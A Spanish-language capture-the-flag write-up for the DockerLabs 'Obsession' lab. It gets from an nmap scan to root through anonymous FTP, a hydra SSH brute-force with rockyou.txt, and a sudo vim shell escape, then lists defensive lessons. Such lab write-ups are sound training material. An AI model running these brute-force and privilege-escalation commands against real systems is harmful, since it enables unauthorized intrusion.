# 🛡️ Writeup – Obsession (DockerLabs)

Este documento describe el proceso completo de resolución del reto **Obsession**, desde el reconocimiento inicial hasta la obtención de acceso **root**. La metodología empleada sigue la cadena clásica de pentesting:

**Reconocimiento → Enumeración → Acceso inicial → Escalada de privilegios → Root**

---

## 1️⃣ Información General

| Campo         | Información               |
|--------------:|:-------------------------|
| **Nombre**    | Obsession                |
| **Dificultad**| Muy Fácil               |
| **IP objetivo**| 172.17.0.2              |
| **Plataforma**| DockerLabs              |

### 🎯 Objetivo

Obtener acceso al sistema realizando:
- Enumeración de servicios y puertos
- Búsqueda de credenciales débiles o expuestas
- Acceso inicial
- Escalada de privilegios hasta root

---

## 2️⃣ Reconocimiento

Para conocer qué servicios estaban expuestos en la máquina, se ejecutó un escaneo con Nmap:

```bash
nmap -sC -sV -oN escaneoInicial.txt 172.17.0.2
```

### ✅ Resultados clave

| Puerto | Servicio | Versión |
|:------:|:--------:|:--------|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.58 (Ubuntu) |

### 🧠 Interpretación

- **FTP (21)**: Permite acceso anónimo → potencial filtración de archivos internos.
- **SSH (22)**: Punto de acceso shell si se obtienen credenciales.
- **HTTP (80)**: Puede exponer información o archivos sensibles.

> ✅ Prioricé FTP porque permite acceso sin autenticación y suele contener información útil (usuarios, contraseñas, archivos de configuración).

---

## 3️⃣ Enumeración del Servicio FTP

Se accedió al servicio FTP usando credenciales anónimas:

```bash
ftp 172.17.0.2
# user: anonymous
# pass: anonymous
```

### 📂 Archivos encontrados

- `chat-gonza.txt`
- `pendientes.txt`

> El objetivo aquí es revisar el contenido de los archivos para localizar posibles usuarios, credenciales o rutas internas.

---

## 4️⃣ Análisis de Archivos

Se descargó y analizó `chat-gonza.txt` en busca de cualquier referencia útil. El archivo contenía una conversación que mencionaba claramente un usuario del sistema.

### 🧠 Hallazgo clave

- Usuario identificado: **`russoski`**

> Esto nos da un objetivo claro para intentar autenticar por SSH.

---

## 5️⃣ Fuerza Bruta SSH (Hydra)

Con el usuario identificado, se intentó encontrar su contraseña usando una wordlist conocida (`rockyou.txt`):

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

### ✅ Resultado

```text
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

> Se encontró la contraseña **`iloveme`**, lo que permitió el acceso inicial por SSH.

---

## 6️⃣ Acceso inicial al sistema

Con las credenciales obtenidas, iniciamos sesión por SSH:

```bash
ssh russoski@172.17.0.2
```

Verificamos el usuario actual:

```bash
whoami
# russoski
```

✅ **Acceso inicial conseguido** como `russoski`.

---

## 7️⃣ Escalada de Privilegios

Para escalar privilegios, revisamos qué comandos puede ejecutar `sudo` sin contraseña:

```bash
sudo -l
```

### 🔍 Salida relevante

```text
(root) NOPASSWD: /usr/bin/vim
```

> El usuario puede ejecutar `vim` como root sin contraseña, lo que es una configuración insegura y sirve como vector de escalada (GTFOBins).

---

## 8️⃣ Explotación (GTFOBins)

Se utilizó `vim` para obtener una shell raíz:

```bash
sudo vim -c ':!/bin/sh'
```

Esto abre una shell con privilegios de root.

---

## 9️⃣ Acceso Root

Dentro de la shell obtenida, confirmamos el usuario:

```bash
whoami
# root
```

✅ **Acceso completo al sistema (root) conseguido.**

---

## 🔟 Conclusión

### 🔴 Vulnerabilidades detectadas

| Vulnerabilidad | Impacto |
|:--------------:|:--------|
| FTP anónimo habilitado | Exposición de información interna |
| Credenciales débiles | Acceso remoto no autorizado |
| Configuración insegura de `sudo` | Escalada directa a root |

### ⛓️ Cadena de ataque

**Reconocimiento → FTP anónimo → Información en archivo → Usuario → Fuerza bruta SSH → Acceso SSH → sudo inseguro → Root**

### 📚 Lecciones aprendidas

- Nunca habilitar FTP anónimo en producción.
- Evitar contraseñas débiles y usar políticas de fuerza.
- Limitar los comandos permitidos con `sudo` y evitar `NOPASSWD`.
- Revisar constantemente la exposición de información interna (archivos, chats, configuraciones).

---

## 🚀 Bonus (mentalidad pentester)

Este CTF es un ejemplo clásico de la cadena de ataque:

👉 **Información → Credenciales → Acceso → Escalada**

---

✍️ Autor: Raúl Bustamante
🎓 Carrera: Ingeniería Informática
🔐 Intereses: Ciberseguridad, Pentesting, CTF
